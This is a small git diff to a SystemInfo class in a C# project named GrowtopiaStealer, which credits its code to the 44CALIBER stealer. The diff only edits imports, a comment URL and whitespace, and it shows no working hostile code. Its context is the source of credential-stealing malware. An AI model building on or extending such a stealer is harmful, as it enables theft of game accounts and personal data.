@@ -1,12 +1,11 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Drawing;
-using System.IO;
 using System.Management;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/Khainaaeh/44CALIBER/blob/main/44CALIBER/Targets/Информация/SystemInfo.cs
+namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/Khainaaeh/44CALIBER/
 {
     class SystemInfo
     {
@@ -145,6 +144,5 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer tha
             }
             return null;
         }
-
     }
 }
